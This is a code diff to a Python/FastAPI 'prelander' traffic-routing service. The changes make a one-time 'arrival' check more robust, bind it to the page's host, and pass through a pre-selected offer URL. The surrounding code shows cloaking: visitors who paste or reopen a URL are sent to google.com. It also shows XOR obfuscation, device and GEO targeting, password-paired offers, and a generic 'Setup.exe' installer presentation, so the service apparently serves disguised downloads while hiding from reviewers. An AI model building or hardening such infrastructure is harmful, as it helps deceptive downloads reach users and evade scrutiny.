@@ -55,9 +55,9 @@ _XOR_KEY = "mxp2026"
 # Where pasted / typed / re-opened prelander URLs are sent. Change to any domain.
 PASTE_REDIRECT_URL = "https://www.google.com"
 
-# How long the "arrival" flag lives after the redirect flow completes. The
-# prelander page claims it within a second or two of loading.
-ARRIVAL_TTL_SECONDS = 20
+# Slow connections/background tabs may take much longer than 20 seconds to
+# load. The one-use arrival must remain claimable while its session is valid.
+ARRIVAL_TTL_SECONDS = 300
 _ARRIVAL_KEY = "pl_arrive:{}"
 
 
@@ -100,7 +100,7 @@ def _paste_redirect() -> RedirectResponse:
     )
 
 
-async def _mark_arrival(redis, pl_session_id: str) -> None:
+async def _mark_arrival(redis, pl_session_id: str, ttl: int = ARRIVAL_TTL_SECONDS) -> None:
     """
     Flag "the redirect flow just completed for this browsing session". The
     page's first /claim call consumes it. Never breaks the caller.
@@ -108,7 +108,7 @@ async def _mark_arrival(redis, pl_session_id: str) -> None:
     if not redis or not pl_session_id:
         return
     try:
-        await redis.set(_ARRIVAL_KEY.format(pl_session_id), "1", ex=ARRIVAL_TTL_SECONDS)
+        await redis.setex(_ARRIVAL_KEY.format(pl_session_id), max(1, ttl), "1")
     except Exception as e:
         logger.warning("[PRELANDER] Could not set arrival flag (non-fatal): %s", e)
 
@@ -652,6 +652,7 @@ async def _resolve_slug_impl(slug: str, request: Request, db):
             offer_id=session.offer_id or None,
             campaign_id=session.campaign_id or None,
             country_code=session.country_code or None,
+            resolved_offer_url=session.offer_url or None,
         )
 
     # ── Domain-type detection & hop ───────────────────────────────────────────
@@ -804,12 +805,13 @@ async def _resolve_slug_impl(slug: str, request: Request, db):
                 if pl_session_id:
                     # The redirect flow just completed for this visitor: allow
                     # THIS tab to claim its one-time arrival (see /claim).
-                    await _mark_arrival(redis, pl_session_id)
+                    await _mark_arrival(redis, pl_session_id, auth_session.expires_at - int(time.time()))
                     response_data = await _get_prelander_data(
                         request, decoded["os"], db,
                         offer_id=session_offer or decoded.get("offer_id"),
                         campaign_id=session_campaign or decoded.get("campaign_id"),
                         country_code=session_country or decoded.get("country_code"),
+                        resolved_offer_url=auth_session.offer_url or None,
                     )
                     from fastapi.responses import Response as _FAR
                     import json as _json
@@ -832,6 +834,7 @@ async def _resolve_slug_impl(slug: str, request: Request, db):
         offer_id=session_offer or decoded.get("offer_id"),
         campaign_id=session_campaign or decoded.get("campaign_id"),
         country_code=session_country or decoded.get("country_code"),
+        resolved_offer_url=auth_session.offer_url or None,
     )
 
 
@@ -895,7 +898,8 @@ async def claim_arrival(request: Request):
 
         # Session must still be a valid, unexpired browsing session.
         session = await pas.validate_prelander_session(sid, redis)
-        if session is None:
+        from app.services.domain_service import normalize_domain
+        if session is None or session.prelander_host != normalize_domain(request.headers.get("host", "")):
             return JSONResponse(status_code=403, content={"ok": False})
 
         # getdel = atomic read + delete → only the FIRST caller wins.
@@ -914,7 +918,7 @@ async def claim_arrival(request: Request):
                 headers={"Cache-Control": "no-store, private"},
             )
 
-        return {"ok": True}
+        return JSONResponse(content={"ok": True}, headers={"Cache-Control": "no-store, private"})
     except Exception:
         logger.exception("[PRELANDER] /claim failed — denying")
         return JSONResponse(status_code=503, content={"ok": False})
@@ -1125,7 +1129,7 @@ async def prelander_bootstrap(
         # The redirect flow is complete: the tab that follows this 302 to "/" may
         # claim its one-time arrival (GET /prelander/claim). Any tab opened later by
         # pasting the URL finds the flag consumed and is sent to PASTE_REDIRECT_URL.
-        await _mark_arrival(redis, pl_session_id)
+        await _mark_arrival(redis, pl_session_id, session.expires_at - int(time.time()))
 
         # CLEAN FINAL URL (spec): the visible prelander URL must be
         # https://prelander-domain.com/ — no slug, no ids, no routing info, at
@@ -1155,13 +1159,15 @@ async def _get_prelander_data(
     campaign_id: Optional[str] = None,
     country_code: Optional[str] = None,
     skip_auth: bool = False,
+    resolved_offer_url: Optional[str] = None,
 ):
     """Core prelander data resolution logic.
 
     Args:
         skip_auth: If True, bypasses authorization for testing/preview purposes
     """
-    os_lower = os.lower()
+    from app.services.traffic_router import slug_os_param
+    os_lower = slug_os_param(os)
 
     # Prelander template override — if the host IS a Prelander domain, use its
     # template setting to pin the page to a specific OS. The browser's real
@@ -1211,7 +1217,9 @@ async def _get_prelander_data(
         file_name, file_ext, file_size = "Setup", ".exe", "3.8 MB"
         file_version, file_description = "1.0.0", "Windows Application Installer"
 
-    offer_url = None
+    # The targeting engine already selected this URL (including device/GEO
+    # rules). Do not route again and silently switch to a campaign fallback.
+    offer_url = resolved_offer_url
     password = None
     campaign_name = None
 
@@ -1225,7 +1233,7 @@ async def _get_prelander_data(
                 offer = await db.offers.find_one({"_id": offer_id, "status": "active"})
             if offer:
                 logger.info(f"[PRELANDER] Found offer: {offer.get('name')} (ID: {offer_id})")
-                offer_url = offer.get("offer_url")
+                offer_url = offer_url or offer.get("offer_url")
                 password = offer.get("password") or None
                 if offer.get("campaign_id"):
                     try:
